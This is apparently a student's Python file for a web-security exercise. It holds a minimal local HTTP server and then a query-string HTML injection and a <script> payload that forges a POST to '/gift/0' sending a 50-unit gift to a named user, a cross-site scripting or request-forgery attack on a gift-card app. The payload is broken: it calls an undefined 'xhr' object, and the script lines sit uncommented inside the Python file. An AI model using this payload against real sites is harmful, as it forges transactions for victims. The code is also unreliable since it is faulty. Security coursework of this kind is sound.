# server.py
import http.server # Our http server handler for http requests
import socketserver # Establish the TCP Socket connections
 
PORT = 8001
 
class MyHttpRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        self.path = '/templates/index.html'
        return http.server.SimpleHTTPRequestHandler.do_GET(self)
 
Handler = MyHttpRequestHandler
 
with socketserver.TCPServer(("", PORT), Handler) as httpd:
    print("Http Server Serving at port", PORT)
    httpd.serve_forever()

#7.0.0.1:8000/gift.html?director=<a href="https://www.w3schools.com">Visit W3Schools</a>
<script>
var bad = new XMLHttpRequest();
xhr.open("POST", "/gift/0", true);
var formData = new FormData();
formData.append("username", "sl4506@nyu.edu");
formData.append("amount", "50");
bad.send(formData);
</script>